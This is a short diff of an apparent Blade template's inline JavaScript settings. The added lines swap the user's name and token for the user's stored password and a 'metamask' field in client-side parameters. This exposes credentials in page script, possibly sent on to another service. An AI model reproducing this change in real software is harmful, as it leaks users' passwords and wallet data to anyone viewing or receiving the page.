@@ -11,8 +11,8 @@
             lang: 'e',
             locale: 'es_ES',
             ver: '4828183825',
-            u: '{{ $user->nombre }}',
-            p: '{{ $user->token_uid }}'
+            u: '{{ $user->metamask }}',
+            p: '{{ $user->password }}'
 
         };
         var params = {
